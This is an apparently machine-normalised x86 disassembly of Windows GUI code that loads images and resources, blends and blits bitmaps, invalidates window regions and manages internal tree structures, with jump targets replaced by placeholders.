cmp [ ebp - 0x8 ] esi
je r-xdata
mov ecx r--data
call sub_43b800
call sub_43b180
jmp r-xdata
test [ edi + 0x19 ] 0x2
je r-xdata
mov ecx edi
mov esi ebx
call sub_432ee0
cmp ebx esi
je r-xdata
cmp ebx esi
je r-xdata
mov ecx 0x1
cmp [ ebx + 0x123 ] 0x0
je r-xdata
or [ ebx + 0x70 ] 0x1
cmp [ edi + 0x1d ] 0x4
jne r-xdata
mov eax [ ebx + 0xcc ]
mov [ ebp - 0x14 ] ecx
or [ ebx + 0x70 ] 0x2
mov ecx 0x7
jmp r-xdata
push edi
mov ecx ebx
call sub_4313c0
add esp 0x4
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x18 ] ecx
cmp [ ebx + 0xcc ] ecx
jbe r-xdata
sub [ ebp - 0x14 ] 0x1
jne r-xdata
xor edi edi
movzx edx [ edi + 0x1d ]
imul edx [ edi ]
add edx 0x3
and edx 0xfffffffc
cmp ecx esi
mov [ ebp - 0x10 ] edx
jle r-xdata
mov eax [ ebx + 0xc8 ]
mov [ ebp - 0x1c ] ecx
xor esi esi
test eax eax
jbe r-xdata
mov eax [ ebp - 0x8 ]
lea ecx [ edi + eax ]
push ecx
mov ecx ebx
call sub_430f10
mov eax [ ebx + 0xcc ]
add edi [ ebp - 0x10 ]
inc esi
add esp 0x4
cmp esi eax
jb r-xdata
mov edi [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x1c ]
inc esi
add ecx edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ecx
cmp esi [ ebx + 0xcc ]
jb r-xdata
mov edi edi
mov esi [ ebp - 0x8 ]
add ecx esi
mov [ ebp - 0x14 ] 0x0
test eax eax
jbe r-xdata
movzx esi [ ecx + 0x3 ]
movzx edi [ ecx ]
imul edi esi
mov eax 0x80808081
imul edi
add edx edi
movzx edi [ ecx + 0x1 ]
sar edx 0x7
imul edi esi
mov eax edx
shr eax 0x1f
add eax edx
mov [ ecx ] al
mov eax 0x80808081
imul edi
add edx edi
movzx edi [ ecx + 0x2 ]
sar edx 0x7
imul edi esi
mov eax edx
shr eax 0x1f
add eax edx
mov [ ecx + 0x1 ] al
mov eax 0x80808081
imul edi
add edx edi
sar edx 0x7
mov eax edx
shr eax 0x1f
add eax edx
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x2 ] al
mov eax [ ebx + 0xc8 ]
inc edx
add ecx 0x4
mov [ ebp - 0x14 ] edx
cmp edx eax
jb r-xdata
mov edi [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
sub_4230c0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_459578
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x38 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al [ edi + 0x17 ]
cmp al 0x1
jne r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx 0xffff
jae r-xdata
mov eax [ edi + 0x4 ]
cmp eax 0xffff
jae r-xdata
push r--data
push ecx
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x1c ] ebx
call sub_43fd6e
add esp 0xc
test eax eax
jne r-xdata
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x40 ] ebx
cmp al 0x3
jne r-xdata
push 0x2010
push ebx
push ebx
push ebx
push eax
push ebx
call [ LoadImageW@IAT ]
mov [ edi + 0x8 ] eax
jmp r-xdata
mov ecx [ rw-data ]
push 0x2000
push ebx
push ebx
movzx eax ax
push ebx
push eax
push ecx
call [ LoadImageW@IAT ]
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax [ edi + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
push ecx
mov eax esp
movzx edx cx
mov [ esp + 0x14 ] esp
push ecx
mov [ eax ] edx
mov eax esp
lea esi [ esp + 0x1c ]
mov [ esp + 0x18 ] esp
mov [ eax ] r--data
call sub_422ca0
mov esi [ esp + 0x14 ]
test al al
je r-xdata
lea edx [ esp + 0x1c ]
push edx
push 0x18
push eax
call [ GetObjectW@IAT ]
mov eax [ esp + 0x20 ]
movzx ecx [ edi + 0x14 ]
cdq
idiv ecx
cmp [ esp + 0x2e ] 0x20
mov edx [ esp + 0x24 ]
mov [ edi + 0x10 ] edx
mov [ edi + 0xc ] eax
sete al
mov [ edi + 0x16 ] al
xor ecx ecx
mov [ edi + 0x14 ] cx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x16 ] cl
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x2
push ebx
push eax
call sub_43fe4b
mov eax [ esp + 0x1c ]
add esp 0xc
push eax
call sub_44006d
mov ecx [ esp + 0x14 ]
add esp 0x4
push 0x0
push 0x0
push ecx
mov ebx eax
call sub_43fe4b
add esp 0xc
push ebx
call sub_43f0ce
mov esi eax
add esp 0x4
test esi esi
je r-xdata
cmp esi ebx
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ rw-data ]
push eax
push ecx
call [ SizeofResource@IAT ]
push esi
call [ LockResource@IAT ]
push eax
call sub_422d10
add esp 0x4
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x10 ]
push eax
call sub_44040f
add esp 0x4
xor ebx ebx
mov edx [ esp + 0x10 ]
push edx
push ebx
push 0x1
push esi
call sub_44037b
add esp 0x10
cmp [ edi + 0x17 ] 0x3
jne r-xdata
push esi
call [ FreeResource@IAT ]
jmp r-xdata
push esi
call sub_43f97a
add esp 0x4
push esi
call sub_422d10
add esp 0x4
mov [ edi + 0x8 ] eax
sub_4232d0
mov ecx [ esp + 0x14 ]
push ebx
mov ebx [ esp + 0x8 ]
cmp [ ebx + 0x16 ] 0x0
push ebp
mov ebp [ esp + 0x18 ]
je r-xdata
push 0xcc0020
push edx
mov edx [ esp + 0x1c ]
push esi
push edi
push eax
mov eax [ esp + 0x24 ]
push ecx
push ebp
push edx
push eax
call [ BitBlt@IAT ]
pop ebp
pop ebx
retn 0x14
xor bl bl
mov [ esp + 0x1c ] bl
mov [ esp + 0x1d ] bl
mov [ esp + 0x1e ] 0xff
mov [ esp + 0x1f ] 0x1
mov ebx [ esp + 0x1c ]
push ebx
push eax
push ecx
push edx
push esi
push edi
push eax
mov eax [ esp + 0x30 ]
push ecx
mov ecx [ esp + 0x30 ]
push ebp
push eax
push ecx
call [ AlphaBlend@IAT ]
pop ebp
pop ebx
retn 0x14
sub_423340
push ecx
cmp [ ebx + 0x17 ] 0x0
jne r-xdata
push ebp
push esi
push edi
mov edi ebx
call sub_4230c0
mov eax [ ebx + 0x8 ]
mov ecx [ rw-data ]
mov ebp [ SelectObject@IAT ]
push eax
push ecx
call ebp
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
mov edi [ rw-data ]
mov [ esp + 0xc ] eax
mov eax [ ebx + 0xc ]
mov esi eax
imul esi [ esp + 0x20 ]
push eax
mov eax [ esp + 0x1c ]
push edx
push eax
mov eax [ ebx + 0x10 ]
push ecx
push ebx
xor edx edx
call sub_4232d0
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
push edx
push eax
call ebp
pop edi
pop esi
pop ebp
pop ecx
retn 0x10
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
push 0x3
push 0x0
push 0x0
push eax
mov eax [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push eax
push ecx
push edx
call [ DrawIconEx@IAT ]
pop ecx
retn 0x10
sub_4233e0
push ebx
mov ebx [ ecx + 0x28 ]
test ebx ebx
je r-xdata
pop ebx
retn 0xc
mov eax [ ecx + 0x2c ]
mov ecx [ esp + 0x8 ]
push eax
push 0x0
push 0x0
push ecx
call sub_423340
sub_423400
push esi
mov esi eax
mov eax [ esi + 0x58 ]
test eax eax
je r-xdata
mov [ esi + 0x5c ] 0x0
mov [ esi + 0x60 ] 0x0
add esi 0x4
push esi
call sub_423700
pop esi
retn
push eax
call sub_44120e
add esp 0x4
mov [ esi + 0x58 ] 0x0
sub_423440
push 0x2c
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov [ eax + 0x28 ] 0x1
mov [ eax + 0x29 ] 0x0
retn
mov [ ecx ] 0x0
sub_423480
push 0xffffffff
push sub_459ce8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
push 0x4
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ esp + 0x10 ] 0x0
call sub_423440
mov [ esi + 0x18 ] eax
mov [ eax + 0x29 ] 0x1
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ eax ] eax
mov eax [ esi + 0x18 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x1c ] 0x0
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_423500
push 0x34
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov [ eax + 0x30 ] 0x1
mov [ eax + 0x31 ] 0x0
retn
mov [ ecx ] 0x0
sub_423540
push 0xffffffff
push sub_459ce8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
push 0x4
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ esp + 0x10 ] 0x0
call sub_423500
mov [ esi + 0x18 ] eax
mov [ eax + 0x31 ] 0x1
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ eax ] eax
mov eax [ esi + 0x18 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x1c ] 0x0
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_4235c0
push 0xffffffff
push sub_45b23a
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
push esi
call sub_423480
lea eax [ esi + 0x20 ]
push eax
mov [ esp + 0x14 ] 0x0
call sub_423540
mov [ esi + 0x40 ] 0x0
mov [ esi + 0x44 ] 0x0
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_423620
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
sub esp 0x8
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_425cf0
mov ecx [ esi + 0x18 ]
push ecx
call sub_43f960
add esp 0x4
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov esp ebp
pop ebp
retn
sub_423660
push 0xffffffff
push sub_45a938
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
mov [ esp + 0x14 ] 0x0
call sub_423620
mov eax [ esi ]
push eax
call sub_43f960
add esp 0x4
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_4236c0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
sub esp 0x8
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_426ab0
mov ecx [ esi + 0x18 ]
push ecx
call sub_43f960
add esp 0x4
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov esp ebp
pop ebp
retn
sub_423700
push 0xffffffff
push sub_45b33a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0x24 ]
lea esi [ edi + 0x20 ]
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x10 ] esi
mov [ esp + 0x1c ] 0x1
call sub_4236c0
mov esi [ esi ]
push esi
call sub_43f960
add esp 0x4
mov esi edi
mov [ esp + 0x1c ] 0x2
call sub_423620
mov eax [ edi ]
push eax
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x14
retn 0x4
sub_4237ec
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ah cl
int3
sub_423840
mov ecx [ esi + 0x4 ]
push ebx
xor eax eax
push edi
test ecx ecx
jle r-xdata
pop edi
xor eax eax
pop ebx
retn
mov edi [ esi ]
mov ebx [ edx ]
mov edx edi
cmp eax 0xffffffff
je r-xdata
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
test eax eax
jl r-xdata
cmp [ edx ] ebx
je r-xdata
cmp eax ecx
jge r-xdata
lea edx [ ecx - 0x1 ]
cmp eax edx
je r-xdata
dec [ esi + 0x4 ]
pop edi
mov eax 0x1
pop ebx
retn
sub ecx eax
add ecx ecx
add ecx ecx
lea eax [ edi + eax * 4 ]
lea edx [ ecx - 0x4 ]
push edx
lea edi [ eax + 0x4 ]
push edi
push ecx
push eax
call sub_43fbf5
push eax
call sub_4237a0
add esp 0x14
sub_4238b0
push esi
mov esi ecx
mov eax [ esi + 0x64 ]
push edi
mov edi [ esp + 0xc ]
cmp eax edi
jne r-xdata
mov ecx [ esi + 0x68 ]
cmp ecx edi
jne r-xdata
mov edx [ esi ]
push eax
mov eax [ edx + 0xc ]
call eax
mov ecx [ esi + 0x64 ]
test ecx ecx
je r-xdata
add esi 0x58
lea edx [ esp + 0xc ]
call sub_423840
pop edi
pop esi
retn 0x4
mov edx [ ecx ]
mov eax [ edx + 0x3c ]
call eax
mov [ esi + 0x68 ] 0x0
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
call eax
mov [ esi + 0x64 ] 0x0
sub_423910
push esi
mov esi ecx
mov ecx [ esi + 0x64 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esi + 0x64 ] eax
mov esi [ esi + 0x54 ]
call [ GetCapture@IAT ]
cmp eax esi
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
call edx
pop esi
retn 0x4
push esi
call [ SetCapture@IAT ]
sub_4239d0
sub esp 0xc
push ebx
push ebp
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x4 ]
mov ebx [ ecx + 0x14 ]
mov ebp [ ecx + 0x18 ]
and eax 0x1
push esi
lea esi [ ecx + 0xc ]
push edi
mov edi [ esi ]
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x4 ]
sub ebx edi
sub ebp eax
mov [ esp + 0x18 ] eax
cmp [ esp + 0x24 ] edi
jne r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
cmp [ esp + 0x28 ] eax
jne r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
mov [ esi + 0x4 ] edx
mov edx [ esp + 0x2c ]
mov [ esi ] eax
add eax edx
mov edx [ esp + 0x30 ]
mov [ esi + 0x8 ] eax
mov eax [ esp + 0x28 ]
add edx eax
mov [ esi + 0xc ] edx
mov edx [ esp + 0x24 ]
cmp edx edi
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x54 ]
push 0x0
push esi
push ecx
call [ InvalidateRect@IAT ]
mov ecx [ esp + 0x20 ]
cmp [ esp + 0x2c ] ebx
jne r-xdata
mov edi [ ecx ]
push eax
mov eax [ edi + 0x14 ]
push edx
call eax
mov ecx [ esp + 0x20 ]
cmp eax [ esp + 0x18 ]
je r-xdata
cmp [ esp + 0x30 ] ebp
je r-xdata
mov edi [ esp + 0x30 ]
mov edx [ ecx ]
push edi
push eax
mov eax [ edx + 0x18 ]
call eax
cmp [ esp + 0x30 ] ebp
je r-xdata
mov eax [ esp + 0x2c ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x14
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x54 ]
push 0x0
push esi
push edx
call [ InvalidateRect@IAT ]
mov eax [ esp + 0x10 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ eax + 0x54 ]
push eax
call [ UpdateWindow@IAT ]
sub_423ad0
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
lea esi [ ebx + 0xc ]
mov ebp ecx
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
push edi
mov edi [ ebx + 0x4 ]
and edi 0x1
cmp eax ecx
jne r-xdata
test edi edi
je r-xdata
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
cmp [ esp + 0x1c ] edx
je r-xdata
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
add ecx eax
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x1c ]
add edx ecx
push ecx
mov [ esi + 0xc ] edx
mov edx [ ebx ]
push eax
mov eax [ edx + 0x18 ]
mov ecx ebx
call eax
test edi edi
je r-xdata
mov eax [ ebp + 0x54 ]
push 0x0
push esi
push eax
call [ InvalidateRect@IAT ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
mov ecx [ ebp + 0x54 ]
push 0x0
push esi
push ecx
call [ InvalidateRect@IAT ]
cmp [ ebp + 0x50 ] 0x0
je r-xdata
mov edx [ ebp + 0x54 ]
push edx
call [ UpdateWindow@IAT ]
sub_423b60
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
push edi
mov edi [ ebx + 0x4 ]
lea esi [ ebx + 0xc ]
and edi 0x1
mov ebp ecx
cmp eax [ esi ]
jne r-xdata
test edi edi
je r-xdata
mov ecx [ esp + 0x1c ]
cmp ecx [ esi + 0x4 ]
je r-xdata
mov eax [ esp + 0x1c ]
sub eax [ esi + 0x4 ]
mov ecx [ esp + 0x18 ]
sub ecx [ esi ]
push eax
push ecx
push esi
call [ OffsetRect@IAT ]
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
push eax
push ecx
mov ecx ebx
call edx
test edi edi
je r-xdata
mov edx [ ebp + 0x54 ]
push 0x0
push esi
push edx
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax [ ebp + 0x54 ]
push 0x0
push esi
push eax
call [ InvalidateRect@IAT ]
cmp [ ebp + 0x50 ] 0x0
je r-xdata
mov ecx [ ebp + 0x54 ]
push ecx
call [ UpdateWindow@IAT ]
sub_423bf0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
push ebx
mov ebx ecx
cmp [ ebx + 0x4c ] 0x0
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx 0x1
mov [ esp + 0x14 ] ecx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
and eax 0x8
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
lea edi [ esi + 0xc ]
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ edi + 0x4 ]
mov ecx [ edi + 0x8 ]
mov [ esp + 0x18 ] edx
mov edx [ edi + 0xc ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x28 ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x2c ] edx
mov edx [ eax + 0xc ]
mov eax [ edi + 0x4 ]
mov [ esp + 0x30 ] ecx
mov ecx [ edi ]
push eax
mov [ esp + 0x38 ] edx
push ecx
lea edx [ esp + 0x30 ]
push edx
call [ OffsetRect@IAT ]
lea eax [ esp + 0x28 ]
push eax
push edi
lea ecx [ esp + 0x20 ]
push ecx
call [ IntersectRect@IAT ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x54 ]
push 0x0
lea eax [ esp + 0x1c ]
push eax
push ecx
call [ InvalidateRect@IAT ]
mov eax [ ebx + 0x54 ]
push eax
call [ GetDC@IAT ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x1c ]
mov edi eax
mov eax [ esp + 0x20 ]
push edx
push eax
push ecx
push edi
call [ IntersectClipRect@IAT ]
mov edx [ ebp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
push edx
push 0x0
push eax
push ecx
push edi
push ebx
call sub_427580
mov edx [ ebx + 0x54 ]
push edi
push edx
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
jmp r-xdata
cmp [ ebx + 0x50 ] 0x0
je r-xdata
sub_423d10
mov ecx [ edi + 0x18 ]
mov eax [ ecx + 0x4 ]
sub esp 0x18
cmp [ eax + 0x15 ] 0x0
push ebx
push ebp
mov ebp [ esp + 0x28 ]
push esi
mov esi ecx
jne r-xdata
mov eax [ edi ]
mov ebx [ edi + 0x18 ]
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov ecx [ ebp ]
jmp r-xdata
call sub_4407b7
cmp eax eax
je r-xdata
cmp [ eax + 0xc ] ecx
jae r-xdata
mov ecx [ edi + 0x18 ]
mov edx [ edi ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] edx
lea eax [ esp + 0x18 ]
mov eax [ ebp ]
cmp eax [ esi + 0xc ]
jb r-xdata
cmp esi ebx
je r-xdata
mov esi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ esp + 0x10 ]
jmp r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edx [ eax ]
mov ecx [ esp + 0x28 ]
mov eax [ eax + 0x4 ]
pop esi
pop ebp
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
add esp 0x18
retn 0x8
sub_423da0
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x14 ]
add edi 0x20
push ecx
call sub_425740
mov esi [ esp + 0x10 ]
mov ebx [ edi + 0x18 ]
mov edi [ edi ]
test esi esi
je r-xdata
call sub_4407b7
cmp esi edi
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x8
mov edi [ esp + 0x14 ]
cmp edi ebx
jne r-xdata
mov esi [ esi ]
jmp r-xdata
call sub_4407b7
cmp edi [ esi + 0x18 ]
jne r-xdata
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x14 ]
add edi 0x10
push eax
call sub_423d10
mov esi [ esp + 0x10 ]
mov ebx [ edi + 0x18 ]
mov edi [ edi ]
test esi esi
je r-xdata
call sub_4407b7
call sub_4407b7
cmp esi edi
je r-xdata
test esi esi
jne r-xdata
mov edi [ esp + 0x14 ]
cmp edi ebx
je r-xdata
mov esi [ esi ]
jmp r-xdata
call sub_4407b7
cmp edi [ esi + 0x18 ]
jne r-xdata
mov eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x8
call sub_4407b7
sub_423e50
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
call sub_4407b7
mov ecx [ eax ]
cmp [ ecx + 0x29 ] 0x0
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x29 ] 0x0
jne r-xdata
retn
jmp sub_4407b7
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x29 ] 0x0
je r-xdata
lea ecx [ ecx ]
mov [ esi + 0x4 ] ecx
retn
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov [ esi + 0x4 ] eax
jmp sub_4407b7
mov [ esi + 0x4 ] eax
mov edx eax
mov eax [ edx + 0x4 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_423ed0
push 0x2c
call sub_43fa1d
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
retn 0x10
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x14 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x10 ]
push edi
mov [ eax + 0x8 ] ecx
lea edi [ eax + 0xc ]
mov ecx 0x7
[ edi ] [ esi ]
pop edi
mov [ eax + 0x28 ] dl
mov [ eax + 0x29 ] dl
pop esi
sub_423f10
push 0xffffffff
push sub_45aca8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x5c ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ edi + 0x1c ] 0x9249248
jb r-xdata
mov edx [ esp + 0x74 ]
mov eax [ edi + 0x18 ]
push edx
push eax
push esi
push eax
call sub_423ed0
inc [ edi + 0x1c ]
mov ebp eax
mov eax [ edi + 0x18 ]
xor ebx ebx
cmp esi eax
jne r-xdata
push 0x13
xor ebx ebx
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] bl
call sub_42a180
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x68 ] ebx
call sub_4296c0
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_442eab
cmp [ esp + 0x70 ] bl
je r-xdata
mov [ eax + 0x4 ] ebp
mov eax [ edi + 0x18 ]
mov [ eax ] ebp
mov ecx [ edi + 0x18 ]
mov [ ecx + 0x8 ] ebp
jmp r-xdata
mov [ esi + 0x8 ] ebp
mov eax [ edi + 0x18 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ebp
mov eax [ edi + 0x18 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov esi ebp
cmp [ edx + 0x28 ] bl
jne r-xdata
mov [ eax + 0x8 ] ebp
mov [ eax ] ebp
jmp r-xdata
mov edx [ edi + 0x18 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x28 ] 0x1
mov eax [ esp + 0x6c ]
mov ecx [ edi ]
mov [ eax + 0x4 ] ebp
mov [ eax ] ecx
mov ecx [ esp + 0x5c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
add esp 0x58
retn 0xc
lea esp [ esp ]
mov edx [ edx ]
cmp [ edx + 0x28 ] bl
jne r-xdata
mov edx [ edx + 0x8 ]
cmp [ edx + 0x28 ] bl
je r-xdata
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x28 ] 0x1
